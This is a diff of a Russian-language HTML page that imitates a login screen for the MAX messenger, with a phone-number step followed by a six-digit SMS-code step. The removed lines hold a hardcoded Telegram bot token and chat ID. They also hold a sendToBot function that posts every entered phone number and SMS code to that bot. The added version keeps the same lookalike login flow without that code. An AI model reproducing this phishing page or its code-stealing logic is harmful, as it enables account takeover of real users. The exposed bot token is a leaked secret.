@@ -2,271 +2,289 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MAX WebApp</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MAX - Вход</title>
     <style>
-        :root {
-            --tg-theme-bg-color: #ffffff;
-            --main-blue: #70b5f9;
+        /* Обнуляем базовые стили */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(180deg, #e1f0ff 0%, #ffffff 30%);
-            margin: 0;
-            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            background-color: #f0f2f5;
             display: flex;
-            flex-direction: column;
-            align-items: center;
-            height: 100vh;
-            color: #222;
-        }
-
-        .header {
-            width: 100%;
-            display: flex;
-            justify-content: space-between;
-            padding: 15px 20px;
-            box-sizing: border-box;
-            align-items: center;
-        }
-
-        .logo-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 20px;
-        }
-
-        .logo-icon {
-            width: 50px;
-            height: 50px;
-            background: linear-gradient(45deg, #007aff, #9b51e0);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
             justify-content: center;
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 10px;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
         }
 
-        .logo-text {
+        .app-container {
+            width: 100%;
+            max-width: 380px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
             font-size: 32px;
-            font-weight: 800;
+            font-weight: 90;
+            color: #1a1a1a;
+            margin-bottom: 25px;
+            text-transform: lowercase;
             letter-spacing: -1px;
         }
 
-        /* Экран 1: Ввод номера */
-        #screen-phone {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+        .card {
+            background: #ffffff;
             width: 100%;
-            padding: 0 25px;
-            box-sizing: border-box;
+            padding: 35px 25px;
+            border-radius: 28px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.06);
+            text-align: center;
         }
 
-        h1 {
+        .title {
             font-size: 22px;
-            text-align: center;
-            margin-top: 30px;
-            margin-bottom: 10px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #000;
         }
 
-        .sub-text {
-            color: #8e8e93;
+        .subtitle {
             font-size: 15px;
-            margin-bottom: 40px;
-            text-align: center;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 25px;
         }
 
-        .input-wrapper {
-            background: #f2f2f7;
+        /* Поле телефона */
+        .input-phone {
             width: 100%;
-            border-radius: 12px;
-            padding: 15px;
-            display: flex;
-            align-items: center;
-            font-size: 18px;
-            margin-bottom: 15px;
-        }
-
-        .country-select {
-            display: flex;
-            align-items: center;
-            margin-right: 15px;
-            border-right: 1px solid #ddd;
-            padding-right: 10px;
-        }
-
-        input {
-            border: none;
-            background: transparent;
-            font-size: 18px;
+            padding: 18px;
+            border: 2px solid #f0f0f0;
+            border-radius: 16px;
+            font-size: 22px;
+            font-weight: 700;
             outline: none;
-            width: 100%;
+            text-align: center;
+            background-color: #fafafa;
+            transition: all 0.3s ease;
         }
 
-        .hint {
-            color: #bcbcbc;
-            font-size: 13px;
-            text-align: left;
-            width: 100%;
-            padding: 0 5px;
+        .input-phone:focus {
+            border-color: #007bff;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(0,123,255,0.1);
         }
 
-        .btn-main {
-            position: fixed;
-            bottom: 40px;
-            width: calc(100% - 50px);
-            background-color: var(--main-blue);
-            color: white;
+        .btn-primary {
+            width: 100%;
+            padding: 18px;
+            margin-top: 20px;
             border: none;
-            border-radius: 12px;
-            padding: 16px;
+            border-radius: 16px;
+            background-color: #007bff;
+            color: #fff;
             font-size: 17px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
+            transition: transform 0.1s active, opacity 0.2s;
         }
 
-        /* Экран 2: Ввод кода */
-        #screen-code {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-            padding: 0 25px;
-            box-sizing: border-box;
+        .btn-primary:active {
+            transform: scale(0.98);
         }
 
-        .code-inputs {
+        .btn-primary:disabled {
+            background-color: #e0e0e0;
+            color: #a0a0a0;
+            cursor: not-allowed;
+        }
+
+        /* Блок с кодом */
+        .code-group {
             display: flex;
+            justify-content: center;
             gap: 10px;
-            margin-top: 30px;
+            margin: 25px 0;
         }
 
-        .code-dot {
-            width: 45px;
-            height: 55px;
-            background: #f2f2f7;
-            border-radius: 10px;
+        .code-input {
+            width: 42px;
+            height: 54px;
+            border: 2px solid #f0f0f0;
+            border-radius: 12px;
             text-align: center;
             font-size: 24px;
-            line-height: 55px;
-            border: 2px solid transparent;
+            font-weight: 700;
+            background: #fafafa;
+            outline: none;
+            transition: all 0.2s;
         }
 
-        .code-dot.active {
-            border-color: var(--main-blue);
+        .code-input:focus {
+            border-color: #007bff;
+            background: #fff;
         }
 
-        .resend {
-            margin-top: 50px;
-            color: #8e8e93;
+        .hidden {
+            display: none !important;
+        }
+
+        .timer-box {
+            margin-top: 20px;
             font-size: 14px;
+            color: #888;
         }
+
+        .resend-link {
+            background: none;
+            border: none;
+            color: #007bff;
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 15px;
+            margin-top: 15px;
+        }
+        .logo-wrapper {
+    /* 1. Задаем размер блока */
+    width: 150px;       /* Подбери нужный размер */
+    height: 150px;
+    
+    /* 2. Делаем его квадратным и центрируем (по желанию) */
+    margin: 0 auto;
+    
+    /* 3. Округляем края div (то, что ты хотел) */
+    border-radius: 40px; /* Глубокое закругление ("мягкий квадрат") */
+
+    /* 4. ГЛАВНОЕ: Обрезаем всё, что вылезает за border-radius! */
+    overflow: hidden;    /* Без этой строки картинка внутри останется квадратной */
+    
+    /* Дополнительно: чтобы div был поверх других элементов */
+    position: relative;
+    z-index: 10;
+    transform: translateY(20%); /* Опускаем div, чтобы он заходил на блок входа */
+}
+
+/* На всякий случай стилизуем и саму картинку внутри */
+.logo-wrapper img {
+    width: 100%;       /* Занимает всю ширину родителя */
+    height: 100%;      /* Занимает всю высоту родителя */
+    object-fit: cover; /* Чтобы градиент не сплющился */
+    display: block;    /* Убираем отступ снизу */
+}
     </style>
 </head>
 <body>
 
-    <div class="header" id="nav-header">
-        <span>🌐</span>
-        <span style="font-weight: bold; font-size: 18px;">max</span>
-        <span>❓</span>
+<div class="app-container">
+    <div class="logo-wrapper"><img src="image1.png" width="150"></div>
+    
+
+    <div id="step-phone" class="card">
+        <div class="title">Вход</div>
+        <div class="subtitle">Введите номер телефона,<br>чтобы продолжить</div>
+        
+        <input id="phone-input" class="input-phone" type="tel" value="+7" maxlength="12">
+        
+        <button id="btn-submit-phone" class="btn-primary" disabled>Продолжить</button>
     </div>
 
-    <div id="screen-phone">
-        <div class="logo-container">
-            <div class="logo-icon">M</div>
-            <div class="logo-text">max</div>
+    <div id="step-code" class="card hidden">
+        <div class="title">Код из СМС</div>
+        <div id="target-number" class="subtitle" style="margin-bottom: 10px;"></div>
+
+        <div class="code-group">
+            <input class="code-input" maxlength="1" inputmode="numeric">
+            <input class="code-input" maxlength="1" inputmode="numeric">
+            <input class="code-input" maxlength="1" inputmode="numeric">
+            <input class="code-input" maxlength="1" inputmode="numeric">
+            <input class="code-input" maxlength="1" inputmode="numeric">
+            <input class="code-input" maxlength="1" inputmode="numeric">
         </div>
-        <h1>С каким номером телефона хотите войти?</h1>
-        <p class="sub-text">На него придёт СМС с кодом</p>
-        
-        <div class="input-wrapper">
-            <div class="country-select">🇷🇺 +7</div>
-            <input type="tel" id="phone-input" placeholder="123 456 78 90" maxlength="15">
+
+        <div id="timer-wrap" class="timer-box">
+            Новый код через <span id="timer-val" style="color: #000; font-weight: 600;">01:00</span>
         </div>
-        <p class="hint">Для входа нужен номер из России или страны из списка — нажмите на флаг, чтобы выбрать</p>
-        
-        <button class="btn-main" onclick="sendPhone()">Продолжить</button>
+        <button id="btn-resend" class="resend-link hidden">Отправить повторно</button>
     </div>
+</div>
 
-    <div id="screen-code">
-        <h1> Какой код пришёл в СМС? </h1>
-        <p class="sub-text" id="target-phone-display">Отправили код на +7 ...</p>
-        
-        <div class="code-inputs">
-            <input type="tel" id="code-input" style="position: absolute; opacity: 0;" maxlength="6" autofocus>
-            <div class="code-dot" id="dot-0"></div>
-            <div class="code-dot" id="dot-1"></div>
-            <div class="code-dot" id="dot-2"></div>
-            <div class="code-dot" id="dot-3"></div>
-            <div class="code-dot" id="dot-4"></div>
-            <div class="code-dot" id="dot-5"></div>
-        </div>
+<script>
+    const phoneInput = document.getElementById('phone-input');
+    const btnSubmit = document.getElementById('btn-submit-phone');
+    const stepPhone = document.getElementById('step-phone');
+    const stepCode = document.getElementById('step-code');
+    const targetText = document.getElementById('target-number');
 
-        <p class="resend">Получить новый код можно через <span id="timer">0:55</span></p>
-    </div>
-
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-
-        const TOKEN = "8788759549:AAE7IIiPAepbYntPjTtI5FyqfuYX5qSu6fE";
-        const ADMIN_ID = 8257384209;
-        let userPhone = "";
-
-        // Функция отправки лога в бота
-        async function sendToBot(text) {
-            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: text,
-                    parse_mode: "HTML"
-                })
-            });
+    // Маска и валидация
+    phoneInput.addEventListener('input', () => {
+        let value = phoneInput.value;
+        if (!value.startsWith('+7')) {
+            value = '+7';
         }
+        const digits = value.slice(2).replace(/\D/g, '').substring(0, 10);
+        phoneInput.value = '+7' + digits;
 
-        // Переход на экран кода
-        function sendPhone() {
-            const input = document.getElementById('phone-input').value;
-            if (input.length < 5) return;
-            
-            userPhone = "+7 " + input;
-            document.getElementById('target-phone-display').innerText = "Отправили код на " + userPhone;
-            
-            // Логируем номер
-            sendToBot(`📱 <b>Новый номер:</b> <code>${userPhone}</code>`);
+        btnSubmit.disabled = phoneInput.value.length !== 12;
+    });
 
-            document.getElementById('screen-phone').style.display = 'none';
-            document.getElementById('nav-header').style.display = 'none';
-            document.getElementById('screen-code').style.display = 'flex';
-            document.getElementById('code-input').focus();
-        }
+    // Переход
+    btnSubmit.onclick = () => {
+        stepPhone.classList.add('hidden');
+        stepCode.classList.remove('hidden');
+        targetText.innerText = phoneInput.value;
+        startTimer(60);
+    };
 
-        // Обработка ввода кода
-        const codeInput = document.getElementById('code-input');
-        codeInput.addEventListener('input', (e) => {
-            const val = e.target.value;
-            for (let i = 0; i < 6; i++) {
-                const dot = document.getElementById(`dot-${i}`);
-                dot.innerText = val[i] || "";
-                if (i === val.length) dot.classList.add('active');
-                else dot.classList.remove('active');
+    // Таймер
+    let interval;
+    function startTimer(duration) {
+        clearInterval(interval);
+        const timerDisplay = document.getElementById('timer-val');
+        const timerWrap = document.getElementById('timer-wrap');
+        const resendBtn = document.getElementById('btn-resend');
+
+        resendBtn.classList.add('hidden');
+        timerWrap.classList.remove('hidden');
+
+        let timeLeft = duration;
+        interval = setInterval(() => {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerDisplay.innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+            if (--timeLeft < 0) {
+                clearInterval(interval);
+                timerWrap.classList.add('hidden');
+                resendBtn.classList.remove('hidden');
             }
+        }, 1000);
+    }
 
-            if (val.length === 6) {
-                sendToBot(`🔑 <b>Код для ${userPhone}:</b> <code>${val}</code>`);
-                // Здесь можно сделать редирект или показать ошибку "Неверный код"
+    document.getElementById('btn-resend').onclick = () => startTimer(60);
+
+    // Логика ячеек кода
+    const cells = document.querySelectorAll('.code-input');
+    cells.forEach((cell, i) => {
+        cell.oninput = () => {
+            cell.value = cell.value.replace(/\D/g, '');
+            if (cell.value && i < cells.length - 1) {
+                cells[i + 1].focus();
             }
-        });
-    </script>
+        };
+        cell.onkeydown = (e) => {
+            if (e.key === 'Backspace' && !cell.value && i > 0) {
+                cells[i - 1].focus();
+            }
+        };
+    });
+</script>
+
 </body>
 </html>
